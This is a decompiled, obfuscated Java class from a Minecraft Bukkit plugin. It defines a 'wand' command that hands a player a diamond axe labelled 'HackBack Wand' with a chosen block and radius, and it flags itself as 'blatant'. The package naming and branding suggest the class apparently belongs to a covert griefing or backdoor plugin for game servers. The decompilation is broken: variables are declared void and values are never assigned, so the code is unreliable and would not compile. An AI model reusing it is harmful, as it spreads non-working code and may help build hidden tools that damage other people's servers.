/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.Material
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.ItemStack
 *  org.bukkit.inventory.meta.ItemMeta
 */
package me.system.runner.command.impl;

import java.util.ArrayList;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class WandCommand
extends Command {
    /*
     * WARNING - void declaration
     */
    @Override
    public void execute(Core llllllllllllllIIlllllIlIIllIIllI, String llllllllllllllIIlllllIlIIllIIlIl, String[] llllllllllllllIIlllllIlIIllIIIlI, Player llllllllllllllIIlllllIlIIllIIIIl) {
        if (llllllllllllllIIlllllIlIIllIIIlI.length == 3) {
            void llllllllllllllIIlllllIlIIllIlIll;
            void llllllllllllllIIlllllIlIIllIllII;
            try {
                Material llllllllllllllIIlllllIlIIlllIIII = Material.valueOf((String)llllllllllllllIIlllllIlIIllIIIlI[1].toUpperCase());
            }
            catch (IllegalArgumentException llllllllllllllIIlllllIlIIllIllll) {
                llllllllllllllIIlllllIlIIllIIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The block ").append(Settings.RED).append(llllllllllllllIIlllllIlIIllIIIlI[1]).append(Settings.WHITE).append(" was not found!"))));
                return;
            }
            try {
                int llllllllllllllIIlllllIlIIllIlllI = Integer.parseInt(llllllllllllllIIlllllIlIIllIIIlI[2]);
            }
            catch (NumberFormatException llllllllllllllIIlllllIlIIllIllIl) {
                llllllllllllllIIlllllIlIIllIIIIl.sendMessage(Settings.PREFIX("The radius has to be a number"));
                return;
            }
            ItemStack llllllllllllllIIlllllIlIIllIlIlI = new ItemStack(Material.DIAMOND_AXE, 1);
            ItemMeta llllllllllllllIIlllllIlIIllIlIIl = llllllllllllllIIlllllIlIIllIlIlI.getItemMeta();
            llllllllllllllIIlllllIlIIllIIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You received a ").append(Settings.RED).append(llllllllllllllIIlllllIlIIllIllII).append(Settings.WHITE).append(" wand"))));
            llllllllllllllIIlllllIlIIllIlIIl.setDisplayName(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&6&lHackBack &f&lWand: ").append(Settings.RED).append(llllllllllllllIIlllllIlIIllIllII))));
            ArrayList<String> llllllllllllllIIlllllIlIIllIlIII = new ArrayList<String>();
            llllllllllllllIIlllllIlIIllIlIII.add(String.valueOf(new StringBuilder().append(Settings.WHITE).append("Radius: ").append(Settings.RED).append((int)llllllllllllllIIlllllIlIIllIlIll)));
            llllllllllllllIIlllllIlIIllIlIIl.setLore(llllllllllllllIIlllllIlIIllIlIII);
            llllllllllllllIIlllllIlIIllIlIlI.setItemMeta(llllllllllllllIIlllllIlIIllIlIIl);
            llllllllllllllIIlllllIlIIllIIIIl.getInventory().addItem(new ItemStack[]{llllllllllllllIIlllllIlIIllIlIlI});
        } else {
            llllllllllllllIIlllllIlIIllIIIIl.sendMessage(Settings.USAGE("wand <block> <radius>"));
        }
    }

    public WandCommand() {
        WandCommand llllllllllllllIIlllllIlIIllllIII;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

